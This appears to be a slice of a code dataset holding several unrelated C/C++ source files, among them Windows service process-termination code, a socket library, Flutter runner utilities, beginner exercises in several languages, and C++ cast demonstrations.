old.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;\r\n\r\n  if (! AdjustTokenPrivileges(token, false, &old, size, NULL, NULL)) {\r\n    CloseHandle(token);\r\n    return INVALID_HANDLE_VALUE;\r\n  }\r\n\r\n  return token;\r\n}\r\n\r\nvoid service_kill_t(nssm_service_t *service, kill_t *k) {\r\n  if (! service) return;\r\n  if (! k) return;\r\n\r\n  ZeroMemory(k, sizeof(*k));\r\n  k->name = service->name;\r\n  k->process_handle = service->process_handle;\r\n  k->pid = service->pid;\r\n  k->exitcode = service->exitcode;\r\n  k->stop_method = service->stop_method;\r\n  k->kill_console_delay = service->kill_console_delay;\r\n  k->kill_window_delay = service->kill_window_delay;\r\n  k->kill_threads_delay = service->kill_threads_delay;\r\n  k->status_handle = service->status_handle;\r\n  k->status = &service->status;\r\n  k->creation_time = service->creation_time;\r\n  k->exit_time = service->exit_time;\r\n}\r\n\r\nint get_process_creation_time(HANDLE process_handle, FILETIME *ft) {\r\n  FILETIME creation_time, exit_time, kernel_time, user_time;\r\n\r\n  if (! GetProcessTimes(process_handle, &creation_time, &exit_time, &kernel_time, &user_time)) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_GETPROCESSTIMES_FAILED, error_string(GetLastError()), 0);\r\n    return 1;\r\n  }\r\n\r\n  memmove(ft, &creation_time, sizeof(creation_time));\r\n\r\n  return 0;\r\n}\r\n\r\nint get_process_exit_time(HANDLE process_handle, FILETIME *ft) {\r\n  FILETIME creation_time, exit_time, kernel_time, user_time;\r\n\r\n  if (! GetProcessTimes(process_handle, &creation_time, &exit_time, &kernel_time, &user_time)) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_GETPROCESSTIMES_FAILED, error_string(GetLastError()), 0);\r\n    return 1;\r\n  }\r\n\r\n  if (! (exit_time.dwLowDateTime || exit_time.dwHighDateTime)) return 2;\r\n  memmove(ft, &exit_time, sizeof(exit_time));\r\n\r\n  return 0;\r\n}\r\n\r\nint check_parent(kill_t *k, PROCESSENTRY32 *pe, unsigned long ppid) {\r\n  /* Check parent process ID matches. */\r\n  if (pe->th32ParentProcessID != ppid) return 1;\r\n\r\n  /*\r\n    Process IDs can be reused so do a sanity check by making sure the child\r\n    has been running for less time than the parent.\r\n    Though unlikely, it's possible that the parent exited and its process ID\r\n    was already reused, so we'll also compare against its exit time.\r\n  */\r\n  HANDLE process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pe->th32ProcessID);\r\n  if (! process_handle) {\r\n    TCHAR pid_string[16];\r\n    _sntprintf_s(pid_string, _countof(pid_string), _TRUNCATE, _T(\"%lu\"), pe->th32ProcessID);\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_OPENPROCESS_FAILED, pid_string, k->name, error_string(GetLastError()), 0);\r\n    return 2;\r\n  }\r\n\r\n  FILETIME ft;\r\n  if (get_process_creation_time(process_handle, &ft)) {\r\n    CloseHandle(process_handle);\r\n    return 3;\r\n  }\r\n\r\n  CloseHandle(process_handle);\r\n\r\n  /* Verify that the parent's creation time is not later. */\r\n  if (CompareFileTime(&k->creation_time, &ft) > 0) return 4;\r\n\r\n  /* Verify that the parent's exit time is not earlier. */\r\n  if (CompareFileTime(&k->exit_time, &ft) < 0) return 5;\r\n\r\n  return 0;\r\n}\r\n\r\n/* Send some window messages and hope the window respects one or more. */\r\nint CALLBACK kill_window(HWND window, LPARAM arg) {\r\n  kill_t *k = (kill_t *) arg;\r\n\r\n  unsigned long pid;\r\n  if (! GetWindowThreadProcessId(window, &pid)) return 1;\r\n  if (pid != k->pid) return 1;\r\n\r\n  /* First try sending WM_CLOSE to request that the window close. */\r\n  k->signalled |= PostMessage(window, WM_CLOSE, k->exitcode, 0);\r\n\r\n  /*\r\n    Then tell the window that the user is logging off and it should exit\r\n    without worrying about saving any data.\r\n  */\r\n  k->signalled |= PostMessage(window, WM_ENDSESSION, 1, ENDSESSION_CLOSEAPP | ENDSESSION_CRITICAL | ENDSESSION_LOGOFF);\r\n\r\n  return 1;\r\n}\r\n\r\n/*\r\n  Try to post a message to the message queues of threads associated with the\r\n  given process ID.  Not all threads have message queues so there's no\r\n  guarantee of success, and we don't want ",
    "/*---------------------------------------------------------*\\\n|  Cross Platform Network Library for Windows and Linux     |\n|  This library provides access to TCP and UDP ports with   |\n|  a common API for both Windows and Linux systems.  It     |\n|  features read and write                                  |\n|                                                           |\n|  Adam Honse (calcprogrammer1@gmail.com), 12/15/2016       |\n\\*---------------------------------------------------------*/\n\n#include \"net_port.h\"\n\n#ifndef WIN32\n#include <sys/ioctl.h>\n#include <netinet/tcp.h>\n#include <sys/types.h>\n#endif\n#include <memory.h>\n#include <errno.h>\n#include <stdlib.h>\n#include <iostream>\n\nconst char yes = 1;\n\nnet_port::net_port()\n{\n    result_list = NULL;\n}\n\n//net_port (constructor)\n//\tWhen created with port information, the constructor\n//\twill automatically open client address <client_name> on port <port>\nnet_port::net_port(const char * client_name, const char * port)\n{\n    udp_client(client_name, port);\n}\n\nnet_port::~net_port()\n{\n    if(result_list)\n    {\n        freeaddrinfo(result_list);\n    }\n}\n\nbool net_port::udp_client(const char * client_name, const char * port)\n{\n    sockaddr_in myAddress;\n\n#ifdef WIN32\n    if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR)\n    {\n        WSACleanup();\n        return(false);\n    }\n#endif\n\n    sock = socket(AF_INET, SOCK_DGRAM, 0);\n    if(sock == INVALID_SOCKET)\n    {\n        WSACleanup();\n        return(false);\n    }\n\n    myAddress.sin_family = AF_INET;\n    myAddress.sin_addr.s_addr = inet_addr(\"0.0.0.0\");\n    myAddress.sin_port = htons(0);\n\n    if(bind(sock, (sockaddr*)&myAddress, sizeof(myAddress)) == SOCKET_ERROR)\n    {\n        WSACleanup();\n        return false;\n    }\n\n    result_list = NULL;\n    addrinfo hints = {};\n    hints.ai_family = AF_INET;\n    hints.ai_socktype = SOCK_DGRAM;\n    if(getaddrinfo(client_name, port, &hints, &result_list) == 0)\n    {\n        memcpy(&addrDest, result_list->ai_addr, result_list->ai_addrlen);\n        freeaddrinfo(result_list);\n        result_list = NULL;\n        return(true);\n    }\n    else\n    {\n        WSACleanup();\n        return(false);\n    }\n}\n\nint net_port::udp_listen(char * recv_data, int length)\n{\n    return(recvfrom(sock, recv_data, length, 0, NULL, NULL));\n}\n\nint net_port::udp_listen_timeout(char * recv_data, int length, int sec, int usec)\n{\n    fd_set fds;\n    struct timeval tv;\n\n    FD_ZERO(&fds);\n    FD_SET(sock, &fds);\n\n    tv.tv_sec   = sec;\n    tv.tv_usec  = usec;\n\n    if(select(sock, &fds, NULL, NULL, &tv) <= 0)\n    {\n        return(0);\n    }\n\n    return(recvfrom(sock, recv_data, length, 0, NULL, NULL));\n}\n\nint net_port::udp_write(char * buffer, int length)\n{\n    return(sendto(sock, buffer, length, 0, (sockaddr *)&addrDest, sizeof(addrDest)));\n}\n\nbool net_port::tcp_client(const char * client_name, const char * port)\n{\n    addrinfo    hints = {};\n\n    connected = false;\n    result_list = NULL;\n\n#ifdef WIN32\n    if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR)\n    {\n        WSACleanup();\n        return(false);\n    }\n#endif\n\n    port = strtok((char *)port, \"\\r\");\n\n    hints.ai_family = AF_UNSPEC;\n    hints.ai_socktype = SOCK_STREAM;\n    getaddrinfo(client_name, port, &hints, &result_list);\n\n    if(result_list == NULL)\n    {\n        WSACleanup();\n        return(false);\n    }\n\n    return(true);\n}\n\nbool net_port::tcp_client_connect()\n{\n    struct addrinfo *res;\n    connected = false;\n\n    for(res = result_list; res; res = res->ai_next)\n    {\n        sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);\n        if(sock == INVALID_SOCKET)\n        {\n            WSACleanup();\n            return(false);\n        }\n\n        u_long arg = 1;\n        fd_set fdset;\n        timeval tv;\n\n        ioctlsocket(sock, FIONBIO, &arg);\n\n        if(result_list == NULL)\n        {\n            connected = false;\n            return(false);\n        }\n        connect(sock, res->ai_addr, res->ai_addrlen);\n\n        FD_ZERO(&fdset);\n        FD_SET(sock, &fdset);\n\n        tv.tv_sec =  4;\n        tv.tv_usec = 0;\n\n        /*-------------------------------------------------*\\\n        | Set socket options - no delay                     |\n        \\*-------------------------------------------------*/\n        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &yes, sizeof(yes));\n\n        if(select(sock + 1, NULL, &fdset, NULL, &tv) == 1)\n        {\n            char so_error;\n            socklen_t len = sizeof(so_error);\n\n            getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);\n\n            if(so_error == 0)\n            {\n                connected = true;\n                arg = 0;\n                ioctlsocket(sock, FIONBIO, &arg);\n            }\n            else\n            {\n                connected = false;\n                closesocket(sock);\n            }\n        }\n        else\n        {\n            connected = false;\n            closesocket(sock);\n        }\n    }\n    return(connected);\n}\n\nbool net_port::tcp_server(const char * port)\n{\n    sockaddr",
    "/*1 - O fatorial de um n\u00famero inteiro n\u00e3o negativo n \u00e9 escrito como n! (pronunciado \u201cn fatorial\u201d) e \u00e9\ndefinido do seguinte modo: para valores , para\n. Por exemplo, , que \u00e9 120. Os fatoriais aumentam de tamanho\nmuito rapidamente. Qual \u00e9 o maior fatorial que seu programa pode calcular antes de gerar um\nestouro de mem\u00f3ria?\nA) Escreva um programa que leia um n\u00famero inteiro n\u00e3o negativo e calcule e imprima seu\nfatorial.b\nB) Escreva um programa que calcule o valor da constante matem\u00e1tica usando a seguinte\nf\u00f3rmula (Nota: Seu c\u00f3digo pode parar ap\u00f3s somar 10 termos.)\nC) Escreva um programa que calcule o valor da constante matem\u00e1tica usando a seguinte f\u00f3rmula\n(Nota: Seu c\u00f3digo pode parar ap\u00f3s somar 10 termos.)*/\n\n\n/*2 - Escreva um programa que imprima os seguintes padr\u00f5es separadamente, um abaixo do outro,\ncada padr\u00e3o separado do pr\u00f3ximo por uma linha em branco. Use la\u00e7os for para gerar os padr\u00f5es.\nTodos os asteriscos (*) devem ser impressos por uma \u00fanica declara\u00e7\u00e3o na forma: cout << \u2018*\u2019 ;\no que faz com que os asteriscos imprimam lado a lado, uma declara\u00e7\u00e3o no formato cout << '\\n';\npode ser usado para passar para a pr\u00f3xima linha. Uma instru\u00e7\u00e3o no formato cout << ' '; pode ser\nusado para exibir um espa\u00e7o para os dois \u00faltimos padr\u00f5es. (Dica: os dois \u00faltimos padr\u00f5es exigem\nque cada linha comece com um n\u00famero apropriado de espa\u00e7os em branco.) Cr\u00e9dito extra: combine\nseu c\u00f3digo dos quatro problemas separados em um \u00fanico programa que imprime todos os quatro\npadr\u00f5es lado a lado, fazendo um uso inteligente dos la\u00e7os aninhados for. Para todas as partes deste\nexerc\u00edcio - minimize o n\u00famero de asteriscos e espa\u00e7os e o n\u00famero de instru\u00e7\u00f5es que imprimem\nesses caracteres.*/\n\n\n/*3 - (Triplos de pit\u00e1goras) Um tri\u00e2ngulo ret\u00e2ngulo pode ter lados que s\u00e3o todos inteiros. O conjunto\nde tr\u00eas valores inteiros para os lados de um tri\u00e2ngulo ret\u00e2ngulo \u00e9 chamado de triplo de pit\u00e1goras.\nEsses tr\u00eas lados devem satisfazer a rela\u00e7\u00e3o de que a soma dos quadrados de dois dos lados \u00e9 igual\nao quadrado da hipotenusa. Encontre todos os triplos pitag\u00f3ricos para lado1, lado2 e hipotenusa,\ntodos com tamanho n\u00e3o superior a 20. Use um la\u00e7o for triplamente aninhado que tente todas as\npossibilidades. Este \u00e9 um exemplo de computa\u00e7\u00e3o de \"for\u00e7a bruta\". Voc\u00ea aprender\u00e1 em cursos de\nci\u00eancia da computa\u00e7\u00e3o mais avan\u00e7ados que existem muitos problemas interessantes para os quais\nn\u00e3o existe uma abordagem algor\u00edtmica conhecida al\u00e9m da pura for\u00e7a bruta. */\n\n\n/*4 - (C\u00e1lculo de vendas) Um varejista on-line vende cinco produtos cujos pre\u00e7os de varejo s\u00e3o os\nseguintes: Produto 1, R$ 2,98; produto 2, R$ 4,50; produto 3, R$ 9,98; produto 4, R$ 4,49 e produto\n5, R$ 6,87. Escreva um aplicativo que leia uma s\u00e9rie de pares de n\u00fameros da seguinte forma:\nA. n\u00famero do produto\nB. quantidade vendida\nSeu programa deve usar uma instru\u00e7\u00e3o switch para determinar o pre\u00e7o de varejo para cada produto.\nDeve calcular e exibir o valor total de varejo de todos os produtos vendidos. Use um la\u00e7o 'while'\npara determinar quando o programa deve parar e exibir os resultados finais.\nn! = n \u00d7 (n \u2212 1) \u00d7 (n \u2212 2) \u00d7 . . .1 n \u2265 1 n! = 1\nn = 0 5! = 5 \u00d7 4 \u00d7 3 \u00d7 2 \u00d7 1\ne\ne = 1 + 1\n1!\n+ 1\n2!\n+ 1\n3!\n+ . . .\nex\nex = 1 +\nx\n1!\n+\nx2\n2!\n+\nx3\n3!\n+ . . .\n*/\n\n\n/*5 - (Programa de impress\u00e3o de gr\u00e1ficos de barras) Uma aplica\u00e7\u00e3o interessante dos computadores \u00e9\nexibir gr\u00e1ficos e tabelas de barras. Escreva um aplicativo que leia cinco n\u00fameros entre 1 e 30. Para\ncada n\u00famero lido, seu programa dever\u00e1 exibir o mesmo n\u00famero de asteriscos adjacentes. Por\nexemplo, se o seu programa l\u00ea o n\u00famero 7, ele dever\u00e1 exibir ******* . Mostrar as barras de\nasteriscos depois de ler todos os cinco n\u00fameros.*/\n\n\n/*6 - Escreva um programa para jogar um jogo de adivinha\u00e7\u00e3o de n\u00fameros. O usu\u00e1rio pensa em um\nn\u00famero entre 1 e 100 e seu programa faz perguntas para descobrir qual \u00e9 o n\u00famero (por exemplo,\n\u201cO n\u00famero em que voc\u00ea est\u00e1 pensando \u00e9 menor que 50?\u201d). Seu programa deve ser capaz de\nidentificar o n\u00famero depois de fazer no m\u00e1ximo sete perguntas. Dica: Use os operadores <, <=, a\nconstru\u00e7\u00e3o if-else e a fun\u00e7\u00e3o rand caso tenha d\u00favida. */\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"getx\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ValidInput.h\"\n\n//constructor and deconstructor\nValidInput::ValidInput() {};\nValidInput::~ValidInput() {};\n\n//keep here or move?\n//function to take only letters and numbers as input\nbool ValidInput::isAlphaNumeric(string input) {\n    for (char c : input) {\n        if (!isalnum(c)) {\n            cout << \"Enter only letters and numbers. Try again.\\n\" << endl;\n            return false;\n        }\n    }\n    return true;\n}\n\n//keep here or move?\n//function to take only numbers and if it is a decimal number no more than 2 decimal places\nbool ValidInput::isTwoDecimalPlaces(double input) {\n    if (input <= 0) {\n        //clear error input due to input type doesn't match and ignore input\n        cin.clear();\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        cout << \"Enter a number greater than 0. Try again.\\n\" << endl;\n        return false;\n    }\n    double roundedInput = round(input * 100) / 100;\n    if (input != roundedInput) {\n        cout << \"Enter a number with 2 decimal places. Try again.\\n\" << endl;\n        return false;\n    }\n    return true;\n}",
    "#include <algorithm>\n#include <cstddef>\n#include <cstring>\n#include <iostream>\n#include <string>\n#include <utility>\n#include <vector>\n#include <queue>\nusing namespace std;\n\nconst int N=1e3;\nint color[N], deg[N], vis[N], num[N], check[N];\nvector<int> g[N];\npair<int, int> e[N];\n\nvoid bfs(int, int);\nvoid printDot(int n, int m, int color[N]);\n\nint main() {\n    int n, m;\n    cin >> n >> m;\n    for(int i=0; i<m; i++) {\n        int u, v;\n        cin >> u >> v;\n        g[u].push_back(v);\n        g[v].push_back(u);\n        deg[u]++;\n        deg[v]++;\n        e[i] = {u, v};\n    }\n    \n    int k = 1, cnt = 0;\n    for(int i=1; i<=n; i++) {\n        k = max(k, deg[i]);\n        if(deg[i] == k)\n            cnt++;\n    }\n    //cout << k << \" \"; \n    \n    int u = 1;\n    while(true) {\n        if(deg[u] < k || cnt == n) // them truong hop do thi chinh quy\n            break;\n        u++;\n    }\n    //cout << u << \" \";\n    bfs(u, n); // sap xep thu tu dinh\n    \n    // gan mau cho dinh\n    fill_n(vis, n+1, 0);\n    for(int j=1; j<=n; j++) {\n        //cout << num[u] << \" \";\n        //cout << vis[u] << \" \";\n        fill_n(check, k+2, 0);\n        //u = j;\n        u = num[j];\n        vis[u] = 1;\n        for(auto v : g[u])\n            if(vis[v]) {\n                check[color[v]] = 1;  \n            }\n        for(int i=1; i<=k+1; i++)\n            if(!check[i])\n                color[u] = i;\n        //cout << color[u] << \" \";\n    }\n    printDot(n, m, color);\n}\n\nvoid bfs(int u, int n) {\n    fill_n(vis, n+1, 0);\n    queue<int> q;\n    q.push(u);\n\n    int j = n; \n    num[j] = u;\n    vis[u] = 1;\n    while(!q.empty()) {\n        int u = q.front();\n        q.pop();\n        for(auto v : g[u]) {\n            if(!vis[v]) {\n                vis[v] = 1;\n                num[--j] = v;\n                q.push(v);\n            }\n        }\n    }\n}\n\nvoid printDot(int n, int m, int color[N]) {\n    string s[10];\n    s[1] = \"red\";\n    s[2] = \"green\";\n    s[3] = \"yellow\";\n    s[4] = \"blue\";\n    s[5] = \"purple\";\n    s[6] = \"orchid\";\n    s[7] = \"hotpink\";\n    s[8] = \"chocolate\";\n    s[9] = \"brown\";\n    //s[10] = \"grey\";\n\n    cout << \"graph dothi {\" << '\\n';\n    for(int u=n; u>=1; u--) {\n        cout << u << \" [fillcolor=\" << s[color[u]] << \", style=filled];\" << '\\n';\n    }\n    for(int i=0; i<m; i++)\n        cout << e[i].first << \" -- \" << e[i].second << \";\" << '\\n';       \n    cout << \"}\";\n}\n",
    "#include \"Application.h\"\r\n\r\nnamespace Velkro\r\n{\r\n\tApplication::Application()\r\n\t{\r\n\t\tWindow::SetEventCallback(OnEvent);\r\n\t}\r\n\tApplication::~Application()\r\n\t{\r\n\t}\r\n\r\n\tvoid Application::OnEvent(Event* event)\r\n\t{\r\n\t\tInputStack::OnEvent(event);\r\n\r\n\t\tdelete event;\r\n\t}\r\n\r\n\tvoid Application::Run()\r\n\t{\r\n\t\tWindow window = Window(\"Velkro Engine\", glm::vec2(800, 600));\r\n\r\n\t\tGUI::Init(window);\r\n\t\tRenderer::Init();\r\n\r\n\t\tstd::unique_ptr<InputLayer> GUIlayer = std::make_unique<GUIinput>();\r\n\t\tInputStack::PushLayer(GUIlayer);\t\t\r\n\r\n\t\tSceneManager::AddScene(new Scene(\"Scene\"));\r\n\t\tSceneManager::AddScene(new Scene(\"Scene2\"));\r\n\r\n\t\tSceneManager::SetActiveScene(\"Scene\");\r\n\r\n\t\tViewport::Init(glm::vec2(1.0f));\r\n\t\t\r\n\t\tEntity* dirt = new Entity(UUID::GenUUID(\"dirt\"));\r\n\t\tdirt->AddComponent(new SpriteComponent(glm::vec2(100.0f, 100.0f), glm::vec2(100, 100), 0.0f, VLK_ASSETS_DIR + \"textures/dirt.png\"));\r\n\r\n\t\tSpriteComponent* spriteComponent = (SpriteComponent*)dirt->GetComponent(VLK_SPRITE_COMPONENT);\r\n\t\tspriteComponent->Position = glm::vec2(200.0f, 200.0f);\r\n\r\n\t\tSceneManager::GetScene(\"Scene\")->AddEntity(dirt);\r\n\t\t\r\n\t\twhile (m_Running)\r\n\t\t{\r\n\t\t\tViewport::Bind();\r\n\r\n\t\t\tRenderer::ClearColourBuffer(); /* In order for GUI viewport to show background colour */\r\n\t\t\t\r\n\t\t\tSceneManager::Update();\r\n\r\n\t\t\tViewport::Unbind();\r\n\r\n\t\t\tGUI::Update();\r\n\r\n\t\t\twindow.Update();\t\t\t\r\n\r\n\t\t\tRenderer::Update();\r\n\r\n\t\t\tif (window.WantClose())\r\n\t\t\t{\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tGUI::Destroy();\r\n\t\t\r\n\t\tSceneManager::Destroy();\r\n\t}\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <stdio.h>\n\nvoid static_cast_demo()\n{\n    int i = 0x12345;\n    char c = 'c';\n    int* pi = &i;\n    char* pc = &c;\n\n    c = static_cast<char>(i);\n    pc = static_cast<char*>(pi); // error static_cast\u53ea\u80fd\u7528\u4e8e\u5e38\u89c4\u7c7b\u578b\u8f6c\u6362\uff0c\u65e0\u6cd5\u7528\u4e8e\u5e38\u89c4\u7c7b\u578b\u6307\u9488\u8f6c\u6362\n}\n\nvoid const_cast_demo()\n{\n    const int& j = 1;\n    int& k = const_cast<int&>(j);\n\n    const int x = 2;\n    int& y = const_cast<int&>(x);\n\n    int z = const_cast<int>(x); // const_cast\u7528\u4e8e\u53bb\u9664\u53d8\u91cf\u53ea\u8bfb\u5c5e\u6027\uff0c\u65e0\u6cd5\u7528\u4e8e\u5e38\u89c4\u7c7b\u578b\u8f6c\u6362\n\n    k = 5;\n\n    printf(\"k = %d\\n\", k);\n    printf(\"j = %d\\n\", j);\n\n    y = 8;\n\n    printf(\"x = %d\\n\", x);\n    printf(\"y = %d\\n\", y);\n    printf(\"&x = %p\\n\", &x);\n    printf(\"&y = %p\\n\", &y);\n}\n\nvoid reinterpret_cast_demo()\n{\n    int i = 0;\n    char c = 'c';\n    int* pi = &i;\n    char* pc = &c;\n\n    pc = reinterpret_cast<char*>(pi);\n    pi = reinterpret_cast<int*>(pc);\n    pi = reinterpret_cast<int*>(i);\n    c = reinterpret_cast<char>(i); // reinterpret\u7528\u4e8e\u5e38\u89c4\u7c7b\u578b\u6307\u9488\u7684\u8f6c\u6362\uff0c\u4e0d\u80fd\u7528\u4e8e\u5e38\u89c4\u7c7b\u578b\u53d8\u91cf\u7684\u8f6c\u6362\n}\n\nvoid dynamic_cast_demo()\n{\n    int i = 0;\n    int* pi = &i;\n    char* pc = dynamic_cast<char*>(pi); // dynamic_cast\u7528\u4e8e\u7c7b\u6307\u9488\u7684\u8f6c\u6362\u5e76\u4e14\u9700\u8981\u865a\u51fd\u6570\u652f\u6301\n}\n\nint main()\n{\n    static_cast_demo();\n    const_cast_demo();\n    reinterpret_cast_demo();\n    dynamic_cast_demo();\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nint main () {\r\n    //Deklarasi Variabel\r\n    string NamaSiswa;\r\n    int NilaiPertandinganI, NilaiPertandinganII, NilaiPertandinganIII;\r\n    float NilaiRata_rata;\r\n    int Juara;\r\n\r\n    //Input Data Siswa\r\n    cout << \"---- PROGRAM HITUNG NILAI RATA-RATA ----\" << endl;\r\n    cout << \"Nama Siswa : \";\r\n    getline(cin, NamaSiswa);\r\n    \r\n    //Input Nilai\r\n    cout << \"Nilai Pertandingan I : \";\r\n    cin >> NilaiPertandinganI;\r\n    cout << \"Nilai Pertandingan II : \";\r\n    cin >> NilaiPertandinganII;\r\n    cout << \"Nilai Pertandingan III : \";\r\n    cin >> NilaiPertandinganIII;\r\n\r\n    //Proses\r\n    NilaiRata_rata = (NilaiPertandinganI + NilaiPertandinganII + NilaiPertandinganIII) / 3.0;\r\n    cout << \"Nilai Rata-rata : \" << NilaiRata_rata << endl;\r\n\r\n    //If\r\n    if (NilaiRata_rata > 80) {\r\n        Juara = 1;\r\n    }\r\n\r\n    else if (NilaiRata_rata > 75) {\r\n        Juara = 2;\r\n    }\r\n\r\n    else if (NilaiRata_rata > 65) {\r\n        Juara = 3;\r\n    }\r\n\r\n    // Else\r\n    else {\r\n        Juara = 0; \r\n    }\r\n\r\n    //Output/Hasil\r\n    cout << \"Siswa yang bernama \" << NamaSiswa << endl;\r\n    cout << \"Memperoleh nilai rata-rata \" << NilaiRata_rata;\r\n    cout << \" dan menjadi juara ke- \" << Juara;\r\n    cout << \" dari hasil perlombaan yang diikutinya. \";\r\n\r\nreturn 0;\r\n\r\n}",
    "/**\n *\n * Fitness-based Conditional Real-Valued Gene-pool Optimal Mixing Evolutionary Algorithm\n *\n * Copyright (c) 2024 by Georgios Andreadis, Tanja Alderliesten, Peter A.N. Bosman, Anton Bouter, and Chantal Olieman\n * This code is licensed under CC BY-NC-ND 4.0. A copy of the license is included in the LICENSE file.\n *\n * If you use this software for any purpose, please cite the most recent pre-print titled:\n * \"Fitness-based Linkage Learning and Maximum-Clique Conditional Linkage Modelling for Gray-box Optimization\n *  with RV-GOMEA\", by Georgios Andreadis, Tanja Alderliesten, and Peter A.N. Bosman. 2024.\n *\n * IN NO EVENT WILL THE AUTHOR OF THIS SOFTWARE BE LIABLE TO YOU FOR ANY\n * DAMAGES, INCLUDING BUT NOT LIMITED TO LOST PROFITS, LOST SAVINGS, OR OTHER\n * INCIDENTIAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR THE INABILITY\n * TO USE SUCH PROGRAM, EVEN IF THE AUTHOR HAS BEEN ADVISED OF THE POSSIBILITY\n * OF SUCH DAMAGES, OR FOR ANY CLAIM BY ANY OTHER PARTY. THE AUTHOR MAKES NO\n * REPRESENTATIONS OR WARRANTIES ABOUT THE SUITABILITY OF THE SOFTWARE, 